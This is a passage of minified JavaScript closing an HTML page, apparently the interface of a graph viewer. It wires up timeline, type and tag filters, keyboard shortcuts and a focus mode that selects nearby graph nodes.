t)return Hs(t,e);var n=Object.prototype.toString.call(t).slice(8,-1);return"Object"===n&&t.constructor&&(n=t.constructor.name),"Map"===n||"Set"===n?Array.from(t):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?Hs(t,e):void 0}}function Hs(t,e){(null==e||e>t.length)&&(e=t.length);for(var n=0,r=new Array(e);n<e;n++)r[n]=t[n];return r}window.addEventListener("DOMContentLoaded",(function(){var t=document.getElementById("timeline-checkbox"),e=document.getElementById("timeline-form"),n=document.getElementById("timeline-ticks");if(e){var r=e.querySelector("output"),i=e.querySelector('input[type="range"]');t.checked=!1,t.addEventListener("change",(function(){t.checked?(e.classList.add("active"),a(),o(),window.addEventListener("resize",a),i.addEventListener("input",o)):(e.classList.remove("active"),window.removeEventListener("resize",a),i.removeEventListener("input",o),gs(ns.filteredByTimeline),js())}))}function o(){var t=i.value;r.value=qs(t);var e,n=[],o=function(t,e){var n="undefined"!=typeof Symbol&&t[Symbol.iterator]||t["@@iterator"];if(!n){if(Array.isArray(t)||(n=function(t,e){if(t){if("string"==typeof t)return Ps(t,e);var n=Object.prototype.toString.call(t).slice(8,-1);return"Object"===n&&t.constructor&&(n=t.constructor.name),"Map"===n||"Set"===n?Array.from(t):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?Ps(t,e):void 0}}(t))||e&&t&&"number"==typeof t.length){n&&(t=n);var r=0,i=function(){};return{s:i,n:function(){return r>=t.length?{done:!0}:{done:!1,value:t[r++]}},e:function(t){throw t},f:i}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var o,a=!0,u=!1;return{s:function(){n=n.call(t)},n:function(){var t=n.next();return a=t.done,t},e:function(t){u=!0,o=t},f:function(){try{a||null==n.return||n.return()}finally{if(u)throw o}}}}(data.nodes);try{for(o.s();!(e=o.n()).done;){var a=e.value,u=a.begin,c=a.end,s=a.id;void 0===c&&(c=Fs),void 0===u&&(u=Rs),t>=u&&t<=c&&n.push(s)}}catch(t){o.e(t)}finally{o.f()}ps(n,ns.filteredByTimeline),js()}function a(){var t=Math.round(e.offsetWidth/100),r=Math.round((Fs-Rs)/t);n.setAttribute("style","--list-length: ".concat(t+1,";")),n.innerHTML="";var a=function(t){var e=document.createElement("option");e.value=t,e.textContent=qs(t),e.addEventListener("click",(function(){i.value=t,o()})),n.appendChild(e)};a(Rs);for(var u=1;u<=t;u++)a(u!==t?Rs+r*u:Fs)}})),window.addEventListener("DOMContentLoaded",(function(){for(var t,e=document.getElementById("types-form"),n=e.querySelectorAll("input"),r=0,i=Object.entries(typeList);r<i.length;r++){var o=Bs(i[r],2),a=o[0],u=o[1].active;e.querySelector('[name="'.concat(a,'"]')).checked=u}d();var c,s=null===(t=new URL(window.location).searchParams.get("filters"))||void 0===t?void 0:t.split("-");if(null!=s&&s.length){for(var h=0,f=Object.entries(typeList);h<f.length;h++){var l=Bs(f[h],1)[0];e.querySelector('[name="'.concat(l,'"]')).checked=s.includes(l)}d()}function d(){var t=new FormData(e);t=Object.fromEntries(t);var n=new Set;t=Object.entries(typeList).filter((function(e){var n=Bs(e,1)[0];return!!t[n]})).forEach((function(t){Bs(t,2)[1].nodes.forEach((function(t){return n.add(t)}))})),ps(Array.from(n),ns.filteredByType)}e.addEventListener("change",d);var p,y=function(t,e){var n="undefined"!=typeof Symbol&&t[Symbol.iterator]||t["@@iterator"];if(!n){if(Array.isArray(t)||(n=Ys(t))){n&&(t=n);var r=0,i=function(){};return{s:i,n:function(){return r>=t.length?{done:!0}:{done:!1,value:t[r++]}},e:function(t){throw t},f:i}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var o,a=!0,u=!1;return{s:function(){n=n.call(t)},n:function(){var t=n.next();return a=t.done,t},e:function(t){u=!0,o=t},f:function(){try{a||null==n.return||n.return()}finally{if(u)throw o}}}}(n);try{var g=function(){var t=p.value,r=t.name;t.checked,t.parentElement.addEventListener("click",(function(t){t.altKey&&(t.stopPropagation(),t.preventDefault(),c===r?(v(),c=void 0):(function(t){n.forEach((function(e){return e.checked=t===e.name})),e.dispatchEvent(new Event("change"))}(r),c=r))}))};for(y.s();!(p=y.n()).done;)g()}catch(t){y.e(t)}finally{y.f()}function v(){e.querySelectorAll("input:not(:checked)").forEach((function(t){return t.checked=!0})),e.dispatchEvent(new Event("change"))}hotkeys("alt+r",(function(t){t.preventDefault(),v()}))})),window.addEventListener("DOMContentLoaded",(function(){var t,e=document.getElementById("tags-form");if(e){var n=document.querySelector(".menu-tags .sorting-select"),r=sorting.tags;c(),s(),n.addEventListener("change",c),e.addEventListener("change",s);var i=null===(t=new URL(window.location).searchParams.get("tags"))||void 0===t?void 0:t.split("-");if(null!=i&&i.length){var o,a=function(t,e){var n="undefined"!=typeof Symbol&&t[Symbol.iterator]||t["@@iterator"];if(!n){if(Array.isArray(t)||(n=Ks(t))){n&&(t=n);var r=0,i=function(){};return{s:i,n:function(){return r>=t.length?{done:!0}:{done:!1,value:t[r++]}},e:function(t){throw t},f:i}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var o,a=!0,u=!1;return{s:function(){n=n.call(t)},n:function(){var t=n.next();return a=t.done,t},e:function(t){u=!0,o=t},f:function(){try{a||null==n.return||n.return()}finally{if(u)throw o}}}}(i);try{for(a.s();!(o=a.n()).done;){var u=o.value;e.querySelector('input[name="'.concat(u,'"]')).checked=!0}}catch(t){a.e(t)}finally{a.f()}e.dispatchEvent(new Event("change"))}Jc("alt+r",(function(t){t.preventDefault(),e.querySelectorAll("input:checked").forEach((function(t){return t.checked=!1})),e.dispatchEvent(new Event("change"))})),window.activeTag=function(t){var n=e.querySelector('input[name="'.concat(t,'"]'));n.checked=!n.checked,e.dispatchEvent(new Event("change"))}}function c(){for(var t=e.querySelectorAll("label"),i=function(t,e){return function(t){if(Array.isArray(t))return t}(t)||function(t,e){var n=null==t?null:"undefined"!=typeof Symbol&&t[Symbol.iterator]||t["@@iterator"];if(null!=n){var r,i,o,a,u=[],c=!0,s=!1;try{if(o=(n=n.call(t)).next,0===e){if(Object(n)!==n)return;c=!1}else for(;!(c=(r=o.call(n)).done)&&(u.push(r.value),u.length!==e);c=!0);}catch(t){s=!0,i=t}finally{try{if(!c&&null!=n.return&&(a=n.return(),Object(a)!==a))return}finally{if(s)throw i}}return u}}(t,e)||Ks(t,e)||function(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}(n.value.split(":"),2),o=i[0],a=i[1],u=0;u<t.length;u++){var c=r[u][o],s=t[u];"reverse"===a&&(c=t.length-1-c),s.style.order=c}}function s(){var t=new FormData(e);t=Object.fromEntries(t);var n=new Set;tagList.filter((function(e){var n=e.name;return!!t[n]})).forEach((function(t){t.nodes.forEach((function(t){return n.add(t)}))})),0!==n.size?ps(Array.from(n),ns.filteredByTag):gs(ns.filteredByTag)}}));var Xs=n(698),$s=n.n(Xs),Vs=n(181);function Zs(t,e){var n="undefined"!=typeof Symbol&&t[Symbol.iterator]||t["@@iterator"];if(!n){if(Array.isArray(t)||(n=function(t,e){if(t){if("string"==typeof t)return Js(t,e);var n=Object.prototype.toString.call(t).slice(8,-1);return"Object"===n&&t.constructor&&(n=t.constructor.name),"Map"===n||"Set"===n?Array.from(t):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?Js(t,e):void 0}}(t))||e&&t&&"number"==typeof t.length){n&&(t=n);var r=0,i=function(){};return{s:i,n:function(){return r>=t.length?{done:!0}:{done:!1,value:t[r++]}},e:function(t){throw t},f:i}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var o,a=!0,u=!1;return{s:function(){n=n.call(t)},n:function(){var t=n.next();return a=t.done,t},e:function(t){u=!0,o=t},f:function(){try{a||null==n.return||n.return()}finally{if(u)throw o}}}}function Js(t,e){(null==e||e>t.length)&&(e=t.length);for(var n=0,r=new Array(e);n<e;n++)r[n]=t[n];return r}var Qs=function(){var t,e=new($s()),n=Zs(data.nodes);try{for(n.s();!(t=n.n()).done;){var r=t.value,i=r.id,o=r.label;e.hasNode(i)||e.addNode(i,{label:o})}}catch(t){n.e(t)}finally{n.f()}var a,u=Zs(data.links);try{for(u.s();!(a=u.n()).done;){var c=a.value,s=c.source,h=c.target;e.hasEdge(s.id,h.id)||e.addEdge(s.id,h.id)}}catch(t){u.e(t)}finally{u.f()}return e}();window.addEventListener("DOMContentLoaded",(function(){var t=document.getElementById("focus-check"),e=document.getElementById("focus-mode-select"),n=document.getElementById("focus-input");if(!1!==focusIsActive){var r;t.checked=!1;var i=new URL(window.location).searchParams,o=Number(i.get("focus"));!1===isNaN(o)&&o>0&&(n.value=o,a()),Jc("f",(function(e){e.preventDefault(),t.checked=!t.checked,t.dispatchEvent(new Event("change"))})),Jc("alt+r",(function(e){e.preventDefault(),t.checked=!1,t.dispatchEvent(new Event("change"))})),t.addEventListener("change",(function(){t.checked?a():(n.classList.remove("active"),n.removeEventListener("input",u),e.removeEventListener("change",c),gs(ns.filteredByFocus))}))}function a(){void 0!==Ns()?(c(),e.addEventListener("change",c),u(),n.classList.add("active"),n.addEventListener("input",u),n.focus()):t.checked=!1}function u(){var t=Ns(),e=[];(0,Vs.a)(Qs,t,(function(t,r,i){return e.push(t),i>=n.valueAsNumber}),{mode:r}),ps(e,ns.filteredByFocus)}function c(){r=e.value,u()}})),n(375)})()})();
    </script>
    

</body>

</html>